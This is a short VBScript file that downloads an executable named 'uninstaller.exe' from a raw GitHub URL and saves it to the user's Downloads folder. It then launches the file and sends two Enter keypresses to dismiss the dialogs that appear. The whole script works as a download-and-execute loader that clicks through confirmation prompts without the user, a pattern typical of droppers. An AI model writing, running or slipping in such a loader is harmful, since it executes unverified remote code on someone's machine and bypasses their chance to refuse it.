' Create objects to handle download and GUI interaction
Set oShell = CreateObject("WScript.Shell")
Set oHTTP = CreateObject("MSXML2.ServerXMLHTTP")

' Define the new download URL and save path
strUrl = "https://github.com/LDXQ/x/raw/refs/heads/main/uninstaller.exe"
strPath = oShell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Downloads\uninstaller.exe"

' Download the file
oHTTP.Open "GET", strUrl, False
oHTTP.Send
If oHTTP.Status = 200 Then
    Set oADO = CreateObject("ADODB.Stream")
    oADO.Open
    oADO.Type = 1 ' Binary
    oADO.Write oHTTP.ResponseBody
    oADO.SaveToFile strPath, 2 ' Overwrite
    oADO.Close
End If

' Start the downloaded executable
oShell.Run chr(34) & strPath & chr(34), 1, False

' Wait for the first dialog window to appear
WScript.Sleep 3000

' Send an "Enter" key press to click the first "OK" button
oShell.SendKeys "{ENTER}"

' Wait for the second dialog window to appear
WScript.Sleep 2000

' Send another "Enter" key press to click the second "OK" button
oShell.SendKeys "{ENTER}"